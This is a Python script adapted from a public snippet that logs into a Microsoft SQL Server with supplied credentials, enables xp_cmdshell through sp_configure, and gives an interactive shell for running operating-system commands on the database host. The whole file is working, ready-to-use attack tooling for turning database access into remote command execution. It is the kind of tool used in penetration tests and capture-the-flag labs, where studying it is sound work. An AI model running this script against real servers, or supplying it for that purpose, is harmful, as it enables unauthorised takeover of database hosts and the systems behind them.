#!/usr/bin/env python
from __future__ import print_function
# Originally Taken From:
# https://raw.githubusercontent.com/Alamot/code-snippets/master/mssql/mssql_shell.py
# CHANGES: 
# 1. I removed upload functionality - too clunky and depending on how you access the target, it can get complicated, 
# also I strongly prefer to not use certuti if I don't have to.  The user should alread know how to get files onto the system
# 2. I added script arguments (I opted to not use argparse)
# 3. I added support for different ports
# 4. I removed unnecessary imports
# Use pymssql >= 1.0.3 (otherwise it doesn't work correctly)


import _mssql
import base64
import sys
try: input = raw_input
except NameError: pass


if len(sys.argv) < 4:
    print("""
    USAGE: Interact with MSSQL through a fake shell and auto-enable 
           command execution, given the right permissions on the server.
           
           {} <server>:<port> <username> <password>""".format(sys.argv[0]))
    sys.exit()

MSSQL_SERVER=sys.argv[1].split(":")[0]
MSSQL_PORT=sys.argv[1].split(":")[1]
MSSQL_USERNAME=sys.argv[2]
MSSQL_PASSWORD=sys.argv[3]

BUFFER_SIZE = 5*1024
TIMEOUT = 30


def process_result(mssql):
    username = ""
    computername = ""
    cwd = ""
    rows = list(mssql)
    for row in rows[:-3]:
        columns = list(row)
        if row[columns[-1]]:
            print(row[columns[-1]])
        else:
            print()
    if len(rows) >= 3:
        (username, computername) = rows[-3][list(rows[-3])[-1]].split('|')
        cwd = rows[-2][list(rows[-3])[-1]]
    return (username.rstrip(), computername.rstrip(), cwd.rstrip())


def shell():
    mssql = None
    stored_cwd = None
    try:
        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD, port=MSSQL_PORT)
        print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)

        print("Trying to enable xp_cmdshell ...")
        mssql.execute_query("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell',1;RECONFIGURE")

        cmd = 'echo %username%^|%COMPUTERNAME% & cd'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        (username, computername, cwd) = process_result(mssql)
        stored_cwd = cwd
        
        while True:
            cmd = input(username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
            if not cmd:
                cmd = "call" # Dummy cmd command
            if cmd.lower()[0:4] == "exit":
                mssql.close()
                return
            mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
            (username, computername, cwd) = process_result(mssql)
            stored_cwd = cwd
            
    except _mssql.MssqlDatabaseException as e:
        if  e.severity <= 16:
            print("MSSQL failed: "+str(e))
        else:
            raise
    finally:
        if mssql:
            mssql.close()


shell()
sys.exit()
